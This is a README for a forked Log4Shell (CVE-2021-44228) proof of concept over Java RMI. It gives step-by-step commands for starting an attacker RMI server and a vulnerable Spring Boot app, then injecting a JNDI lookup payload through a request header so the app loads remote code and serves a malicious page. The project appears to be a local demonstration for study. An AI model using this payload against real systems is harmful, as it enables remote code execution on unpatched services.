A minor change to the forked original:
1. Getting it to work
2. Getting it to work on a Linux VM with JDK 8
3. Limiting it to open its ports localy only

This code may contain malware and is known to contain vulnerabilities. 

Use at your own risk - if you use it, be advised to do that in a VM  - discard the VM after use.

# log4shell-rmi-poc
A Proof of Concept of the Log4j vulnerability (CVE-2021-44228) over Java-RMI
<br/>
It uses Log4j 2.5.7 from spring-boot-starter-log4j2


## Requirements:

Tested with Java 8 (JDK 1.8.0_25) and Java 11 (JDK 11.0.1)

## How to run the POC

### 1. Clone the repo:
```bash
git clone https://github.com/Labout/log4shell-rmi-poc.git
```

### 2. Start the attacker RMI Server

```bash
cd Log4jshell_rmi_server

./startRmiServer.sh 
```

You should get something like this:

![rmi server](./rmi_server.png)


### 3. Start the vulnerable Log4j application (here a spring boot application)

In a new Terminal 

```bash
cd vulnerabel_log4j_app

./startVulnerableService.sh
```


### 4. Get the original site which is in vulnerabel_log4j_app/web

```bash

curl 'http://localhost:8080/web'
```
The original website is returned.


### 5. Inject a vulnerable JNDI over the "User-Agent" header 

```bash

curl 'http://localhost:8080/hello' --header 'Accept-Version: ${jndi:rmi://127.0.0.1:1099/ExecByEL}'
```

The website at  vulnerabel_log4j_app/web gets updated with the site from Log4jshell_rmi_server/web.


### 6. Get the malicious site from vulnerabel_log4j_app/web

```bash

curl 'http://localhost:8080/web'
```

The malicious website is returned.



## References 
https://www.cisecurity.org/log4j-zero-day-vulnerability-response/
<br>
https://www.lunasec.io/docs/blog/log4j-zero-day/
